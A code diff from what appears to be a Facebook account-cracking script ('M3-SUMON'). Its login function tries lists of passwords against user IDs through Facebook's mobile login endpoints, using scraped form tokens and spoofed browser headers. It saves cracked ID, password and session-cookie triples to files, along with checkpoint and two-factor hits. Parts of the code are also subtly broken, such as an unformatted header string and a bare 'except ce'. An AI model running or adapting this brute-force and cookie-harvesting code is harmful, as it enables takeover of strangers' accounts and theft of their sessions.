@@ -1915,91 +1915,99 @@ def p(uid,pwx,tl):
         pass
 
 def x(uid,pwx,tl):
-    global loop
     global oks
     global cps
-    sys.stdout.write('\r\33[1;37m[M3-SUMON] %s|OK:%s \r'%(loop,len(oks))),
+    global twf
+    global loop
+    sys.stdout.write(f"\r {green}(M3-SUMON) ({loop}) (OK-{len(oks)})\r"),
     sys.stdout.flush()
     try:
-        for ps in pwx:
+        for pw in pwx:
+            ua = random.choice(uas)
+            pro = random.choice(SUMONua)
             ses = requests.Session()
-            pro = random.choice(uas)
-            free_fb = session.get('https://m.facebook.com').text
-            log_data = {
-                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-                "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-                "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-                "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
-                "try_number":"0",
-                "unrecognized_tries":"0",
-                "email":uid,
-                "pass":ps,
-                "login":"Log In",
+            p_fb = ses.get("https://m.facebook.com").text
+            lsd = re.search('name="lsd" value="(.*?)"', str(p_fb)).group(1)
+            jazoest = re.search('name="jazoest" value="(.*?)"', str(p_fb)).group(1)
+            m_ts = re.search('name="m_ts" value="(.*?)"', str(p_fb)).group(1)
+            li = re.search('name="li" value="(.*?)"', str(p_fb)).group(1)
+            data = {
+                "lsd": lsd,
+                "jazoest": jazoest,
+                "m_ts": m_ts,
+                "li": li,
+                "try_number": "0",
+                "unrecognized_tries": "0",
+                "email": uid,
+                "pass": pw,
+                "login": "Log In",
             }
-            header_freefb = {
-    'authority': 'p.facebook.com',
-    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-    'accept-language': 'en-US,en;q=0.9',
-    'cache-control': 'max-age=0',
-    'dpr': '2.768749952316284',
-    'sec-ch-prefers-color-scheme': 'light',
-    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
-    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
-    'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-model': '"Infinix X6832"',
-    'sec-ch-ua-platform': '"Android"',
-    'sec-ch-ua-platform-version': '"13.0.0"',
-    'sec-fetch-dest': 'document',
-    'sec-fetch-mode': 'navigate',
-    'sec-fetch-site': 'same-origin',
-    'sec-fetch-user': '?1',
-    'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
-    'viewport-width': '980',
-}
-            lo = session.post('https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
-            log_cookies=session.cookies.get_dict().keys()
-            #print(iid+'|'+pws+'|'+str(log_cookies))
-            if 'c_user' in log_cookies:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                cok = session.cookies.get_dict()
+            headers = {
+            'Host': 'p.facebook.com',
+            'method': 'POST',
+            'path': '/login/Device-based/login/async/',
+            'scheme': 'https',
+            'content-length': '294',
+            'Accept-Encoding': 'gzip',
+            'content-Length': '{len(str(logn_data))}',
+            'sec-ch-ua': '"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"',
+            'dpr': '1.75',
+            'viewport-width': '980',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Windows"',
+            'sec-ch-ua-platform-version': '""',
+            'sec-ch-ua-model': '""',
+            'sec-ch-ua-full-version-list': '',
+            'sec-ch-prefers-color-scheme': 'light',
+            'upgrade-insecure-requests': '1',
+            'user-agent': ua,
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'dnt': '1',
+            'origin': 'https://p.facebook.com',
+            'referer': 'https://p.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Den_GB%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbLoginKey%2522%253A%2522l5wtp952zh681e1p29txn379v1sh15831l4266qdzc3hv1ecocih%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252Fusers%25252Fself%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D5a9dac33-3c79-4a29-b781-1c0b06e0fcb0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%2522l5wtp952zh681e1p29txn379v1sh15831l4266qdzc3hv1ecocih%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252Fusers%25252Fself%2522%257D%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated',
+            'x-requested-with': 'mark.via.gp',
+            'sec-fetch-site': 'none',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-user': '?1',
+            'sec-fetch-dest': 'document',
+            'accept-encoding': 'gzip, deflate, br, zstd',
+            'accept-language': 'en-US,en;q=0.9',}
+            twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
+            url = "https://p.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Den_GB%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbLoginKey%2522%253A%2522l5wtp952zh681e1p29txn379v1sh15831l4266qdzc3hv1ecocih%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252Fusers%25252Fself%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D5a9dac33-3c79-4a29-b781-1c0b06e0fcb0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%2522l5wtp952zh681e1p29txn379v1sh15831l4266qdzc3hv1ecocih%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252Fusers%25252Fself%2522%257D%23_%3D_&display=touch&locale=en_GB&pl_dbl=0&refsrc=deprecated"
+            po = ses.post(url, data=data, headers=headers).text
+            response = ses.cookies.get_dict().keys()
+            if "c_user" in response:
+                cok = ses.cookies.get_dict()
                 cid = cok["c_user"]
-                d = "dev"
-                if "live" in check_lock(cid):
+                coki = ";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
+                check = check_lock(cid)
+                if "live" in check:
                     if '%3A-1%3A-1' in coki:
-                        print('\33[1;94m[DEV-NV] '+cid+' | '+ps+'\33[0;97m')
+                        print(f" {cyan}(SUMON-2F) {cid}|{pw} ")
                         break
                     else:
-                        print('\33[1;92m[DEV-OK] '+cid+' | '+ps+'\33[0;97m')
-                        if "yes" in cookie_show:
-                            print(f"\033[1;32mCOOKIES : {coki}")
-                            open('/sdcard/Dev-Rndm-Ok.txt', 'a').write(f'{cid}|{ps}|{coki}\n')
-                            oks.append(cid)
-                            break
-            elif 'checkpoint' in log_cookies:
+                        print(f" {green}(SUMON-OK) {cid}|{pw} ")
+                        print(f" {white}Cookie : {green}{coki}")
+                        open("/sdcard/SUMON-Number-ok.txt", "a").write(f"{cid}|{pw}|{coki}\n")
+                        oks.append(cid)
+                        break
+                else:
+                    break
+            elif 'checkpoint' in response:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[141:156]
-                if "Enter login code to continue" in log_cookies:
-                    #print('\33[1;94m[DEV-2F] '+uid+' | '+ps+'\33[0;97m')
-                    open('/sdcard/Dev-2f.txt', 'a').write(uid+' | '+ps+'\n')
-                    twf.append(uid)
-                    break
-                else:
-                    #print('\33[1;91m[DEV-CP] '+uid+' | '+ps+'\33[0;97m')
-                    open('/sdcard/Dev-Cp.txt', 'a').write(uid+' | '+ps+'\n')
-                    cps.append(uid)
-                    break
+                print('\33[1;91m[SUMON-CP] '+uid+' | '+pw+'\33[0;97m')
+                open('/sdcard/SUMON-Cp.txt', 'a').write(uid+' | '+pw+'\n')
+                cps.append(uid)
+                break
             else:
                 continue
         loop+=1
-    except net_error:
-        print(net_error)
-        time.sleep(10)
-    except Exception as e:
+    except ce:
+        time.sleep(20)
+    except Exception as error:
         pass
-    except:
-        print(e)
-        #pass
+
 def mobile(uid,pwx,tl):
     global loop
     global oks
